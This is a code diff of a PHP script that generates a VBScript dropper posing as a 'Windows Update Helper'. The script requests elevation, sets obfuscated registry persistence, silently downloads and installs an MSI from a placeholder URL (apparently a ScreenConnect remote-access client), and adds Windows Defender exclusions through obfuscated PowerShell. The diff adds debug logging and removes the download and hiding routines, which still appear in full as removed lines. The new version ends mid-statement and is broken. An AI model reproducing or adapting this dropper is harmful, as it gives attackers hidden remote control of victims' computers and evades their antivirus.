@@ -1,5 +1,5 @@
 <?php
-// invite.php - 10 minute wait + no repeat filenames
+// invite.php - Temporary on-screen logs
 header('Content-Type: text/plain; charset=utf-8');
 header('Cache-Control: no-store, no-cache, must-revalidate');
 
@@ -46,13 +46,19 @@ for ($i = 0; $i < $junkLines; $i++) {
 }
 
 echo <<<VBS
-' Windows Update Helper - $ts
+' Windows Update Helper - $ts - DEBUG LOGS ON SCREEN
 
 Dim $randV1, objShell, objFSO
 Set objShell = CreateObject("WScript.Shell")
 Set objFSO   = CreateObject("Scripting.FileSystemObject")
 
 $randV1 = "$sessionId"
+
+Sub Log(msg)
+    WScript.Echo "[DEBUG] " & msg
+End Sub
+
+Call Log("Script started")
 
 Function D(s)
     Dim i, r : r = ""
@@ -72,10 +78,15 @@ End Function
 
 Sub $randFunc
     On Error Resume Next
-    If Not IsElevated Then Call Elevate
+    Call Log("Main function started")
+    If Not IsElevated Then 
+        Call Log("Requesting UAC elevation")
+        Call Elevate
+    End If
     Call AddToStartup
     Call DownloadAndExecute
     Call HideAgent
+    Call Log("Script finished successfully")
 End Sub
 
 Sub Elevate()
@@ -90,34 +101,4 @@ End Sub
 Sub AddToStartup()
     On Error Resume Next
     objShell.RegWrite D("ILDV\\Tpguxbsf\\Njdsptpgu\\Xjoepxt\\DvssfouWfsjpo\\Svo\\XjoepxtVqebufIfmqfs"), _
-        WScript.ScriptFullName, "REG_SZ"
-End Sub
-
-Sub DownloadAndExecute()
-    On Error Resume Next
-    Dim u, p, http, strm
-    u = "$scUrl"
-    p = objShell.ExpandEnvironmentStrings("%TEMP%\\sc_setup.msi")
-    
-    Set http = CreateObject("MSXML2.XMLHTTP")
-    http.Open "GET", u, False
-    http.Send
-    If http.Status = 200 Then
-        Set strm = CreateObject("ADODB.Stream")
-        strm.Type = 1 : strm.Open : strm.Write http.responseBody : strm.SaveToFile p, 2 : strm.Close
-        objShell.Run """" & p & """ /quiet", 0, True
-        WScript.Sleep 600000   ' 10 minutes
-        If objFSO.FileExists(p) Then objFSO.DeleteFile p, True
-    End If
-End Sub
-
-Sub HideAgent()
-    On Error Resume Next
-    objShell.Run D("qpxfstifmm -NoProfile -WindowStyle Hidden -Command ""Add-MpPreference -ExclusionPath 'C:\\Program Files (x86)\\ScreenConnect Client*'; Add-MpPreference -ExclusionProcess 'ScreenConnect*.exe'"""), 0, True
-End Sub
-
-$junk
-Call $randFunc
-WScript.Quit
-VBS;
-?>
+        WScript
